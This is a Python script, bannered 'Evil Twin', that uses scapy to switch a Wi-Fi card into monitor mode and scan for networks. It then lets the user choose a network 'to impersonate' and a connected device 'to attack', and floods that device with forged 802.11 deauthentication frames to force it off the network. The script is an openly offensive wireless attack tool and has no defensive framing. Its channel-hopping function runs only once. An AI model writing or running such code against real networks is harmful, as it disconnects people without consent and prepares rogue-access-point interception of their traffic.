import os
import sys

from progress.bar import IncrementalBar, ShadyBar, PixelBar, Bar, FillingSquaresBar, ChargingBar, FillingCirclesBar
from progress.spinner import Spinner, MoonSpinner, PixelSpinner, PieSpinner, LineSpinner
from scapy.all import *
from threading import Thread
import pandas
import time
import netifaces
from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon

# global variables
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
networks.set_index("BSSID", inplace=True)
network_mac = dict()
tic = time.perf_counter()
ch = 1
twin = ''
devices = set()
interface = ''
presentation = '''

  ______           _   _     _______              _         
 |  ____|         (_) | |   |__   __|            (_)        
 | |__    __   __  _  | |      | |    __      __  _   _ __  
 |  __|   \ \ / / | | | |      | |    \ \ /\ / / | | | '_ \ 
 | |____   \ V /  | | | |      | |     \ V  V /  | | | | | |
 |______|   \_/   |_| |_|      |_|      \_/\_/   |_| |_| |_|

'''


def main():
    global network_mac
    global presentation
    global interface
    global twin
    print(presentation)
    progress2()
    os.system('clear')
    interface = get_interface()
    monitor_mode(interface)
    print("[+]Interface switched to monitor mode successfully")
    time.sleep(1)
    print("[+]Scanning for wireless networks")
    # change interface wifi channel
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    progbar = Thread(target=progressbar)
    progbar.start()
    sniff(prn=handler, iface=interface, timeout=60, monitor=True)
    time.sleep(1)
    twin = get_network().lower()
    time.sleep(1)
    print('[+]scanning for connected devices')
    progbar = Thread(target=progressbar)
    progbar.start()
    sniff(prn=devices_handler, iface=interface, timeout=60, monitor=True)
    time.sleep(1)
    victim = get_device().lower()
    # deauthentication packet to disconnect the victim device from the network
    deauth = Dot11(type=0, subtype=12, addr1=victim, addr2=twin, addr3=twin)
    # stack packet headers
    deauth_pkt = RadioTap() / deauth / Dot11Deauth(reason=7)
    # send the packet
    sendp(deauth_pkt, inter=0.1, count=100, iface=interface, verbose=1)


# display a progress bar for aesthetics
def progressbar():
    bar_cls = IncrementalBar
    suffix = '%(percent)d%% [%(elapsed_td)s / %(eta)d / %(eta_td)s]'
    with bar_cls('Scanning', suffix=suffix, max=100) as bar:
        for i in range(100):
            bar.next()
            time.sleep(0.6)


# get a list of all the interfaces and return the interface chosen by the user
def get_interface():
    interface_names = netifaces.interfaces()  # get interfaces
    interfaces_length = str(len(interface_names) - 1) + ""
    for i in range(0, len(interface_names)):
        print(i, ":", interface_names[i])
    interface_index = input("\nchoose the WIFI interface you want to sniff packets on: ")
    while '0' > str(interface_index) or str(interface_index) > interfaces_length:  # if the user chose wrong number
        interface_index = input("\n\nERROR: please choose between numbers 0 - " + interfaces_length + ": ")
    iface = interface_names[int(interface_index)]
    return iface


# switch interface to monitor mode
def monitor_mode(iface):
    os.system('sudo ifconfig ' + str(interface) + ' down')
    os.system('sudo iwconfig ' + str(interface) + ' mode monitor')
    os.system('sudo ifconfig ' + str(interface) + ' up')


# change channels
def change_channel():
    global ch
    os.system("iwconfig " + interface + " channel " + str(ch))
    # switch channel from 1 to 14 each 0.5s
    ch = ch % 14 + 1
    time.sleep(0.5)


# captures wireless networks and devices with packets sniffed by scapy
def handler(pkt):
    if pkt.haslayer(Dot11):

        mac_frame = pkt.getlayer(Dot11)
        # if pkt.type == 0 and pkt.subtype == 8:  # beacon which means its coming from a network
        if pkt.haslayer(Dot11Beacon):
            if mac_frame.addr2 not in network_mac:
                ssid = pkt[Dot11Beacon].network_stats()['ssid']
                network_mac[mac_frame.addr2] = ssid


def devices_handler(pkt):
    if pkt.haslayer(Dot11):

        mac_frame = pkt.getlayer(Dot11)
        ds = pkt.FCfield & 0x3  # frame control
        to_ds = ds & 0x1 != 0  # to access point
        from_ds = ds & 0x2 != 0  # from access point

        if from_ds == 1 and to_ds == 0:  # transmitter is AP and destination is client
            if str(mac_frame.addr2).lower() == twin and mac_frame.addr3 not in devices:
                devices.add(mac_frame.addr3)

        if from_ds == 0 and to_ds == 1:  # source address is client and transmitter is AP
            if str(mac_frame.addr1).lower() == twin and mac_frame.addr2 != mac_frame.addr1 \
                    and mac_frame.addr2 not in devices:
                devices.add(mac_frame.addr2)

        if from_ds == 0 and to_ds == 0:  # control frame or managment frame which means src is AP or vice versa
            if str(mac_frame.addr1).lower() == twin and mac_frame.addr2 not in devices:
                devices.add(mac_frame.addr2)
                if str(mac_frame.addr2).lower() == twin and mac_frame.addr1 in devices:
                    devices.add(mac_frame.addr1)


# get a list of networks and return the mac of the network chosen by the user
def get_network():
    global network_mac
    net_index = dict()
    i = 0
    print("Detected networks")
    for network in network_mac:
        print(i, "- " + str(network_mac[network]))
        net_index[str(i)] = network
        i = i + 1
    k = input("Choose the network you want to impersonate: ")
    return net_index[k]


# list of devices connected to the chosen network and return the victim device chosen by the user
def get_device():
    global devices
    device_mac = dict()
    print("mac address of connected devices:")
    i = 0
    for device in devices:
        print(i, "- " + str(device))
        device_mac[str(i)] = device
        i = i + 1
    k = input("Choose the device you want to attack: ")
    return device_mac[k]


def sleep():
    t = 0.01
    t += t * random.uniform(-0.1, 0.1)  # Add some variance
    time.sleep(t)


def progress2():
    bar_cls = FillingCirclesBar

    bar = bar_cls('loading')
    for i in bar.iter(range(200, 400)):
        sleep()


main()
# progressbar()
